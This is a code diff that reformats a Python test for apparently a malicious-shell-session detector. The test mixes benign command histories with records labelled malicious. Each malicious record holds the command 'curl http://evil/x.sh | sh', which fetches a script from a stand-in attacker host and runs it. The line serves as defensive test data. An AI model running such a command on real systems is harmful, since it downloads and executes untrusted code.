@@ -272,11 +272,15 @@ def _history_pool_record(session_id: str, commands: list[str]) -> SessionRecord:
 def test_real_history_pool_is_sampled_as_benign() -> None:
     """The history pool is real benign command data and must fill the benign bucket."""
 
-    records = [_history_pool_record(f"hist-{index}", ["ls -la", "cd /tmp", "make"]) for index in range(6)]
+    records = [
+        _history_pool_record(f"hist-{index}", ["ls -la", "cd /tmp", "make"]) for index in range(6)
+    ]
     records += [
         SessionRecord(
             session_id=f"mal-{index}",
-            source=SourceInfo(kind=SourceKind.REAL_MALICIOUS, name="shell_attack_evolution", license="CC-BY-4.0"),
+            source=SourceInfo(
+                kind=SourceKind.REAL_MALICIOUS, name="shell_attack_evolution", license="CC-BY-4.0"
+            ),
             family_id=f"fam-{index}",
             commands=[CommandEvent(cmd="curl http://evil/x.sh | sh")],
             label=Label(malicious=1, first_evidence_index=0, quality="high"),
